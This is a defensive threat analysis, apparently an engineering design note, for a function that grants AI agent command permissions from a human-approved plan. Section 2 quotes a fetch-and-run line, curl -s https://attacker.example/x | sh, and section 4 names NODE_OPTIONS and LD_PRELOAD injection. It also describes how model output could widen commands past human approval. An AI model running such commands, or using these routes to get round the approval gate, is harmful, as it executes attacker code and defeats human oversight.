# Task 7 threat analysis — plan-named command authorizations

Written before any implementation, as Step 1 of the Task 7 brief.

The function under analysis writes `status: "approved"` `permission` approval records **without a
fresh human act**. It does so on the strength of one earlier human act — the plan approval — and
orchestrator ruling E5, which says that approval covers the commands the approved plan *names*.
Everything below follows from a single observation: **the only thing separating "the human approved
this plan" from "the machine may run this command" is this function's refusals.** Each refusal is
therefore treated as load-bearing, and the analysis is organised around who can move which input.

## 1. The trust boundary

`admitStartCommand` (`packages/contracts/src/runner.ts:1046`) requires, for **every** command it
admits, an `approved` approval of kind `permission` whose `evidenceDigest` equals the command
authorization's `approvalEvidenceDigest`, which must in turn equal `digestCommandScope(scope)`,
whose `commandDigest` must equal `digestCommandSpec(request.command)`. That chain is airtight in
one direction: given an approval, the command it admits is exactly the one the approval names.

It says nothing about **where the approval came from**. `parseTrustedApproval` re-reads the approval
from the durable store and checks kind, status, decision, eligibility, identity and chronology — all
of which a record minted by this function satisfies by construction, because this function mints it.
So the runner's admission gate cannot distinguish a permission approval a human clicked from one
this function derived. The distinction exists *only here*, in what this function refuses to derive.

Inputs, classified by who can move them:

| Input | Who can move it | Trusted? |
| --- | --- | --- |
| `planApproval` (`Approval`) | Durable run stream; a human's decision | Trusted as a record, re-checked for kind/status/decision |
| `planApprovalEvidence` (`stage: "plan_approval"`) | Durable run stream, sealed by the decision | Trusted as a record, chained by digest |
| `planEvidence` (`stage: "plan"`) | Durable run stream, sealed by the plan station | Trusted as a record, chained by digest |
| `planDocument` | **Re-read at derivation time** — from a store an attacker with repository or filesystem access may have edited since | **Untrusted.** Bound by digest, never by id |
| `environmentAuthorization` | Durable run stream, minted by the plan decision | Re-digested here; a forged one must not pass |
| `requests[].command` (executable, args, `usesShell`, `required`) | **The station, influenced by agent output** | **Untrusted.** This is the primary attack surface |
| `requests[].cwd`, `.environment`, `.timeoutSeconds`, `.terminal` | Same | **Untrusted** |
| `dependencies.now`, `.ids` | Composition | Injected, never ambient |

The whole design reduces to: cross the untrusted column against the trusted column, and refuse
anything the trusted column does not positively name.

## 2. The attacker who controls the plan-producing model

The plan station's output is model output over untrusted work-item text. It reaches this function
twice: once as the approved plan (which a human read and accepted), and once as whatever the
implement/verify station asks to run.

1. **A plausible-looking command in the plan.** The model proposes
   `{"executable": "pnpm", "args": ["test"]}` alongside `{"executable": "curl", "args": ["-s",
   "https://attacker.example/x", "|", "sh"]}`. This function cannot defend here and does not
   pretend to: the human read the plan and approved it. The defence is that the plan is *shown*
   before approval and that `usesShell`/`requiredPermissions` are explicit fields in the document a
   human sees. What this function guarantees is only that nothing **beyond** what was shown runs.
2. **Widening after approval.** The far cheaper attack: get a boring plan approved, then have the
   station ask to run something else. Every row of the refusal matrix is this attack in a different
   costume — an extra argument, a removed argument, a reordered argument, a different executable, a
   shell variant, a different working directory. All are refused by exact structural comparison
   against the plan entry, and the comparison is positional and length-checked so that neither
   `args.every(...)` (which ignores extra trailing arguments on the shorter side) nor a
   set/multiset comparison (which ignores order) can be substituted for it.
3. **Order-of-arguments smuggling.** `["--", "rm", "-rf", "."]` versus `["rm", "-rf", ".", "--"]`
   are the same multiset and wildly different commands. Argument comparison is positional.
4. **`usesShell` promotion.** `pnpm test` with `usesShell: false` is one process; the same string
   with `usesShell: true` is an interpreter that re-parses it, at which point `;`, `&&`, `$()` and
   redirection all become live. `usesShell` is part of the match key. Separately, `CommandSpec` has
   no `usesShell` field at all and the contracts forbid shell command-string execution
   (`isForbiddenShellCommandString`), so a plan entry with `usesShell: true` has **no derivable
   `CommandSpec`** and is refused outright with its own code. Both guards exist because they refuse
   different things: the match-key guard refuses a *promoted* command, the derivability guard
   refuses a shell command even when the plan named it as shell.

## 3. The attacker who controls the repository or the plan store

This attacker edits the plan document after a human approved it — the classic
time-of-check/time-of-use split between "a human said yes to bytes B" and "the machine reads bytes
B′ from disk".

1. **Mutate the plan, keep the approval id.** Refused. The binding is a digest chain, checked in
   full at every derivation:
   `planApproval.id === planApprovalEvidence.approvalId` →
   `planApprovalEvidence.approvedEvidenceDigest === planEvidence.evidenceDigest` →
   `planEvidence.planDigest === digestPlanDocument(planDocument)`. An id match with changed content
   breaks at the last link. **A matching `approvalId` with a changed plan does not authorize.**
2. **Mutate the plan and fix up its self-declared `planDigest`.** Also refused: `planDigest` is
   recomputed with `digestPlanDocument` (`admitPlanDocument`) rather than read, and the recomputed
   value is compared against the *evidence envelope's* `planDigest`, which is on the run stream and
   out of the editor's reach.
3. **Swap in another run's approved plan.** Refused on identity: the plan document, the evidence
   envelopes, the approval and the environment authorization scope must all name the same workspace
   and run, and the workspace/run/environment ids written into the derived scope come from the
   **environment authorization's durable scope**, never from the request (doctrine D13).
4. **Forge an environment authorization with a widened scope.** Refused: the record's own
   `digest` is recomputed with `digestEnvironmentAuthorization`, its `approvalId` and
   `approvalEvidenceDigest` must match the plan approval, and the derived command scope copies
   `repositoryIdentity`, `sourceCommit`, `branch`, `cwdRoot`, `networkPolicy`,
   `filesystemDisclosure` from it verbatim — which is also what
   `validateCommandAuthorizationAgainstEnvironment` re-checks at the runner boundary.

## 4. The attacker who controls the *execution parameters* the plan never named

This is the subtlest family, and it is the reason "byte-identical `executable` + `args`" is not by
itself sufficient. `VerificationCommandSchema` names four fields. `CommandSpecSchema` has six, and
the two extra ones — `cwd` and `environment` — are supplied by the caller and change what a
byte-identical command *does*.

1. **Working directory.** `pnpm test` in the workspace root and `pnpm test` in
   `vendor/attacker-submodule` are the same bytes and different programs: the second runs whatever
   `package.json` lives there. There is no plan-side `cwd` to compare against, so the constraint is
   honoured structurally — **every derived spec's `cwd` is pinned to the environment
   authorization's `cwdRoot`, and any request naming a different `cwd` is refused.**

   The standing question bites hard here. `RelativeWorkspacePathSchema.default(".")` means an
   *absent* `cwd` parses to the real value `"."`. A guard written `if (cwd !== undefined && cwd !==
   root) refuse` therefore never fires — `undefined` is unreachable after parse, and if the guard
   runs *before* parse it passes vacuously and then the default silently supplies `"."` for a root
   that is not `"."`. The implementation must parse first and compare the parsed value, and the
   discriminating vector is a non-`"."` `cwdRoot` with the request omitting `cwd` entirely.

   Note also that `admitStartCommand` only requires `cwdIsWithin(cwdRoot, cwd)` — any
   *subdirectory* passes there. Pinning to the root exactly is a deliberate narrowing: the runner's
   check is a floor, not this function's ceiling.
2. **Environment variables.** The strongest remaining smuggling vector, and it defeats byte-identity
   completely if left open: `NODE_OPTIONS=--require /tmp/evil.js` turns an approved `pnpm test` into
   arbitrary code execution without changing one byte of `executable` or `args`. `LD_PRELOAD`,
   `PATH`, `GIT_SSH_COMMAND` and `PYTHONSTARTUP` are the same attack with different spelling. The
   plan approves no environment at all, so **literal environment entries are refused** — a station
   that genuinely needs one is out of envelope and belongs on the Task 8 permission route.
   `credential_ref` entries are admitted only when the ref is named by **both** the approved plan's
   `requiredCredentialRefIds` and the environment authorization's `allowedCredentialRefIds`; the
   plan half is what a human saw, the environment half is what the earlier authorization granted,
   and a secret needs both.
3. **Resource limits and timeout.** A command authorization must narrow, never widen. The derived
   scope copies the environment's cpu and memory ceilings and sets `durationSeconds` to the
   request's own `timeoutSeconds`, refusing any timeout above the environment's ceiling. A widened
   limit would also be caught by `validateCommandAuthorizationAgainstEnvironment`, which is asserted
   directly rather than restated.
4. **Expiry laundering.** A derived authorization that outlived the environment authorization it
   descends from would let a command start against an environment whose own grant had lapsed.
   Expiry is `min(now + ttl, environmentAuthorization.expiresAt)`, and an environment authorization
   already at or past expiry derives nothing at all.

## 5. The attacker who edits this function later

Ruling E5's constraints "must not be softened", and the most likely softening is not malicious — it
is a maintainer making a passing test pass. Three specific regressions, and the vector that catches
each:

1. **A matcher that short-circuits on an empty list.** `commands.length === 0 || commands.some(eq)`
   reads as a harmless guard and authorizes **everything**. `[].some(eq)` is `false` and
   `[].find(eq)` is `undefined`; the two forms differ *only* on the empty list, so **only an
   empty-`verificationCommands` vector separates them.** `PlanDocumentSchema` requires `.min(1)`,
   which means such a plan cannot be parsed — so the vector is a plan document carrying an empty
   array, and the requirement is that it authorizes nothing, whether the refusal comes from the
   schema or from the matcher. Both are correct outcomes; authorizing is not.
2. **A `cwd` guard that passes vacuously.** Covered in §4.1. The vector is a non-`"."` `cwdRoot`
   with `cwd` omitted.
3. **Making matching vacuous outright** — an early return, an inverted condition, a `catch` that
   falls through to mint. The base-case vector (a command matching nothing in the plan) is asserted
   **first** in the test file so this fails loudly and at the top.

## 6. Why refusal is the base case

Not a strictness preference — the only default whose failure mode is survivable.

- **The failure modes are asymmetric, and more so than at any other gate in this pipeline.** A
  wrongly-refused command costs an operator one round trip through the Task 8 permission route,
  which is a route that exists and works. A wrongly-derived one executes an attacker-chosen process
  on the developer's machine, with the developer's filesystem and the run's credentials, carrying a
  durable `status: "approved"` record that says a human authorized it. The audit trail actively
  lies in that case, which makes the wrong direction worse than merely unsafe.
- **Absence is the common input, not the exotic one.** Every optional or defaulted field here
  produces a *real value* when omitted rather than `undefined`: `cwd` defaults to `"."`, `args`
  defaults to nothing meaningful, an empty `environment` array is falsy-adjacent but not falsy. An
  implementation that reasons about `undefined` is reasoning about a state that does not occur, and
  such a guard is indistinguishable from no guard at all until the day it matters.
- **Permission is minted, not merely checked.** Most gates decide over a record someone else wrote.
  This one *writes* the record that a later gate will trust. A check that fails open costs one
  bypass; a mint that fails open manufactures the evidence for every bypass that follows.
- **The derivation must be reconstructible from durable state alone.** Its inputs are the approval,
  two sealed evidence envelopes, the environment authorization, and the plan document bound by
  digest to those envelopes. Nothing is read from model output, nothing from a caller's claim about
  what was approved, and the clock and ids are injected — so an auditor holding the run stream can
  recompute every derived record and get the same bytes.

## 7. What this analysis leaves to other gates

Named so the boundary is explicit. **Executable resolution** — a `pnpm` on `PATH` that is a symlink
to a shell — is the runner's, via `assertResolvedCommandDoesNotUseShellCommandString`; this function
is a lexical gate over declared strings and cannot resolve paths. **Whether the approved plan was a
good idea** is the human's, at the plan approval gate. **Out-of-envelope commands** are Task 8's
permission route, and it is important that the route exists: a gate with no escape hatch gets
widened. **Process isolation, egress control and secret redaction at execution** are the runner's.
This function answers exactly one question: *does the approved plan name this command, byte for
byte, in this working directory, with no execution parameter the plan never granted?*
